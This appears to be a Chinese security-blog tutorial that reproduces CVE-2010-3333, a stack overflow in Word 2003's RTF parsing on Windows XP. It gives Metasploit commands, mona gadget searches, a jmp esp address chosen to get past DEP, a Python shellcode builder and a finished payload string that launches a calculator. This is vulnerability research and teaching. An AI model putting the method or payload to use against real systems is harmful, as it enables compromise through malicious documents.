**最近看CVE-2010-3333漏洞，便亲自动手做一个弹出计算器的POC。**

## 一、实验环境

操作系统：Windows XP SP3简体中文版

漏洞软件：Office Word 2003 11.5604.5606或者11.8169.8172

调试工具：

> IDA Pro 6.8
>
> WinDbg 6.12.0002.633 X86
>
> Immunity Debugger v1.85

首先Word版本一定要匹配，否则调试过程中的溢出地址不同。本实验中Word的版本为11.5604.5606，如图1所示。

![](https://image.3001.net/images/20200219/1582093788_5e4cd5dc5ac7b.png!small)

图1 Word版本

注意Office更新包安装的情况，会对版本号有影响。Microsoft
Office产品的版本号使用下面的形式：aa.bbbb.cccc。此数字代表三个项目：aa：Office的版本：11即2003；12即2007；14即2010。bbbb：程序的可执行文件的版本。例如Winword.exe文件的版本。cccc：mso.dll文件的版本。

在安装Office更新后，可能会更新mso.dll的版本，原始的mso.dll文件会备份到C:\Windows\Installer\$PatchCache$\Managed\目录下。本实验正确的mso.dll版本为11.0.5606.0（默认路径C:\Program
Files\CommonFiles\Microsoft
Shared\office11\mso.dll，文件的MD5值为：251c11444f614de5fa47ecf7275e7bf1），mso.dll文件版本如图2所示。

![](https://image.3001.net/images/20200219/1582093939_5e4cd673e2501.png!small)

图2 mso.dll文件的版本

## 二、确定溢出点

首先使用Metasploit生成可以触发漏洞的rtf文件，命令如下所示。也可以直接去相关论坛下载触发异常的rtf文件，本文使用Metasploit生成的msf_crash.rtf文件。

    
    
    use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
    set target 6
    exploit  
    

打开Word，使用WinDbg附加Word进程，然后使用Word打开msf_crash.rtf文件，触发异常，程序断在0x30e9eb88，如图3所示，此时查看调用栈发现已被破坏。

![](https://image.3001.net/images/20200219/1582094025_5e4cd6c9b0955.png!small)

图3 程序断在0x30e9eb88

再次重启Word，在0x30e9eb88处下断点，然后断下后，查看调用栈，如图4所示。

![](https://image.3001.net/images/20200219/1582094060_5e4cd6ec81a07.png!small)

图4 查看调用栈

使用ub命令查看具体的调用函数，如图5所示。

![](https://image.3001.net/images/20200219/1582094081_5e4cd701ecdb0.png!small)

图5 查看调用函数

根据上述分析我们可知函数调用关系(mso.dll版本为11.0.5606.0)，如图6所示。mso.dll版本为11.0.8172.0时的情况如图7所示。

![](https://image.3001.net/images/20200219/1582094202_5e4cd77ab3372.png!small)

图6 函数调用关系图(mso.dll版本为11.0.5606.0)

![](https://image.3001.net/images/20200219/1582094257_5e4cd7b13f6ae.png!small)

图7 函数调用关系图(mso.dll版本为11.0.8172.0)

## 三、构造POC

在0x30E9EB88处下断点，然后查看栈中，如图8所示。其中esi指向的位置为缓冲区开始位置；edi指向的位置为0x00233DC0，距离函数sub_30F4CC5D返回地址为20个字节。

![](https://image.3001.net/images/20200219/1582094434_5e4cd862df09c.png!small)

图8 溢出时栈分析

此时再对比rtf文件中的内容，发生异常前在EIP=0x30e9eb83时，ECX=0xc8ac，然后执行逻辑右移指令shr
ecx,2，0xc8ac/4=0x322b。因为是双字操作，所以除以4。如图9所示，0xc8ac来源自文件中，esi对应的内容也来自文件中。我们可以通过修改rtf文件控制复制的字节数和复制的内容，便可以覆盖返回地址，这是一个栈溢出漏洞。

![](https://image.3001.net/images/20200219/1582094456_5e4cd878dc93d.png!small)

图9 原始msf_crash.rtf文件

函数sub_30F4CC5D的尾声部分代码如图10所示，又弹出0x14字节，所以在构造poc时，要补上0x14个字节。

![](https://image.3001.net/images/20200219/1582094470_5e4cd88606528.png!small)

图10 函数sub_30F4CC5D尾声代码

根据上述分析我们可以构造出shellcode的布局，如图11所示。

![](https://image.3001.net/images/20200219/1582094588_5e4cd8fc46464.png!small)

图11 shellcode布局

首先找一个jmp esp的地址，我们可以选择0x7FFA4512（即魔法跳转地址，在Win7 32位以下版本中均指向jmp
esp）。也可以使用mona插件寻找一个合适的，本文使用mona插件寻找一个合适的地址。

首先使用!mona modules命令找到一个找到Rebase、SafeSEH、ASLR、NXCompat为False，而OS
DLL为True的系统模块。部分结果如下所示，我们选择OLEACC.dll模块。

    
    
    0BADF00D    Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
    0BADF00D   -----------------------------------------------------------------------------------------------------------------    0BADF00D    0x74be0000 | 0x74c0c000 | 0x0002c000 | False  | False   | False |  False   | True   | 4.2.5406.0 [OLEACC.dll] (C:\WINDOWS\system32\OLEACC.dll)
    0BADF00D    0x73390000 | 0x734e3000 | 0x00153000 | False  | False   | False |  False   | True   | 6.00.9802 [MSVBVM60.DLL] (C:\WINDOWS\system32\MSVBVM60.DLL)
    0BADF00D    0x3b030000 | 0x3b0d9000 | 0x000a9000 | False  | False   | False |  False   | True   | 6.0.0.2527 [IMS**0A.IME] (C:\WINDOWS\system32\IMS**0A.IME)  
    

使用!mona assemble -s "jmp esp"命令生成jmp esp的机器码，机器码为\xff\xe4，如图12所示。

![](https://image.3001.net/images/20200219/1582094679_5e4cd957712b5.png!small)

图12 mona生成jmp esp的机器码

然后使用!mona find -s "\xff\xe4" -m OLEACC.dll命令搜索OLEACC.dll模块中jmp
esp指令，结果如下所示。搜索到2个结果，但是都是{PAGE_READONLY}。

    
    
    0BADF00D   [+] Results :
    74C04B1F     0x74c04b1f : "\xff\xe4" |  {PAGE_READONLY} [OLEACC.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.2.5406.0 (C:\WINDOWS\system32\OLEACC.dll)
    74C074E7     0x74c074e7 : "\xff\xe4" |  {PAGE_READONLY} [OLEACC.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.2.5406.0 (C:\WINDOWS\system32\OLEACC.dll)  
    

为了绕过DEP，我们需要找到可执行的地址，我们继续搜索MSVBVM60.DLL模块，结果如下所示，只有一个地址0x7344745D为可读可执行，我们选择0x7344745D为shellcode中使用的地址。

    
    
    0BADF00D   [+] Results :
    7344745D     0x7344745d : "\xff\xe4" | asciiprint,ascii {PAGE_EXECUTE_READ} [MSVBVM60.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.9802 (C:\WINDOWS\system32\MSVBVM60.DLL)
    734B514B     0x734b514b : "\xff\xe4" | asciiprint,ascii,alphanum {PAGE_READONLY} [MSVBVM60.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.9802 (C:\WINDOWS\system32\MSVBVM60.DLL)
    734B83CF     0x734b83cf : "\xff\xe4" |  {PAGE_READONLY} [MSVBVM60.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.9802 (C:\WINDOWS\system32\MSVBVM60.DLL)
    734C2867     0x734c2867 : "\xff\xe4" | asciiprint,ascii {PAGE_READONLY} [MSVBVM60.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.9802 (C:\WINDOWS\system32\MSVBVM60.DLL)
    734C2C13     0x734c2c13 : "\xff\xe4" | ascii {PAGE_READONLY} [MSVBVM60.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.9802 (C:\WINDOWS\system32\MSVBVM60.DLL)
    734C82B3     0x734c82b3 : "\xff\xe4" |  {PAGE_READONLY} [MSVBVM60.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.9802 (C:\WINDOWS\system32\MSVBVM60.DLL)
    0BADF00D       Found a total of 6 pointers  
    

在查看rtf文件时，发现文件中直接存储的数据的ASCII，故在构造poc时要特别注意。

长度计算如下：40 + 8 + 40 + 23*2 = 134 = 0x86，故在shellcode中填写8600。初步编写shellcode如下。

    
    
    # 建立缓冲区
    length = "8600"                     # 复制长度
    padding = "0" * 40                  # 覆盖返回地址前的20个字节
    padding2 = "0" * 40                 # 平衡"rent 14"弹出的字节
    
    # 返回地址
    jmp_esp = "5D744473"                # 返回地址用于jmp esp。0x7344745D。
    
    # 计算器shellcode
    shellcode = "\x31\xC9"              # xor ecx,ecx
    shellcode += "\x51"                 # push ecx
    shellcode += "\x68\x63\x61\x6C\x63" # push 0x636c6163
    shellcode += "\x54"                 # push dword ptr esp
    shellcode += "\xB8\xAD\x23\x86\x7C" # mov eax,0x7c8623AD 
    shellcode += "\xFF\xD0"             # call eax 调用WinExec
    
    # 退出代码。调用ExitProcess(kernel32.dll)
    shellcode += "\xB8\xFA\xCA\x81\x7C" # mov eax,0x7c81CAFA
    shellcode += "\xFF\xD0"             # call eax
    
    # 构建exploit
    exploit = length + padding + jmp_esp + padding2 + shellcode
    
    file = open('payload.txt','w')
    file.write(exploit)
    file.close  
    

将生成的payload.txt中的所有内容粘贴覆盖原文件中的acc8。在0x30e9eb88处下断点。如图13所示，shellcode中的0x7344745D在内存中被破坏，后面的shellcode也被破坏，难道shellcode中存在坏字符？

![](https://image.3001.net/images/20200219/1582094942_5e4cda5ea4244.png!small)

图13 shellcode中的大写字母在内存中被破坏

经查阅资料和实际验证，在shellcode中所有的英文字母必须为小写。修改后shellcode如下所示。

    
    
    # 建立缓冲区
    length = "8600"                 # 复制长度
    padding = "0" * 40              # 覆盖返回地址前的20个字节
    padding2 = "0" * 40             # 平衡"rent 14"弹出的字节
    
    # 返回地址
    jmp_esp = "5d744473"            # 返回地址用于jmp esp。0x7344745D。
    
    # 计算器shellcode
    shellcode = "31c9"              # xor ecx,ecx
    shellcode += "51"               # push ecx
    shellcode += "6863616c63"       # push 0x636c6163
    shellcode += "54"               # push dword ptr esp
    shellcode += "b8ad23867c"       # mov eax,0x7c8623AD 
    shellcode += "ffd0"             # call eax 调用WinExec
    
    # 退出代码。调用ExitProcess(kernel32.dll)
    shellcode += "b8faca817c"       # mov eax,0x7c81CAFA
    shellcode += "ffd0"             # call eax
    
    # 构建exploit
    exploit = length + padding + jmp_esp + padding2 + shellcode
    
    file = open('payload.txt','w')
    file.write(exploit)
    file.close  
    

生成的payload.txt共有138个字节，文件内容如下。  

    
    
    860000000000000000000000000000000000000000005d744473000000000000000000000000000000000000000031c9516863616c6354b8ad23867cffd0b8faca817cffd0  
    

复制生成的payload.txt中的文件内容，覆盖原文件中的acc8，修改后的rtf文件如图14所示。使用Word打开rtf文件即可成功弹出计算器。

![](https://image.3001.net/images/20200219/1582095090_5e4cdaf2236ea.png!small)

图14 添加payload后的rtf文件

## 四、参考文献

> 《漏洞战争》林桠泉
>
> <https://bbs.pediy.com/thread-246325.htm>CVE-2010-3333漏洞分析与利用
>
> <https://bbs.pediy.com/thread-248052.htm>CVE-2010-3333简单的栈溢出漏洞复现

***本文原创作者：dolphin，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

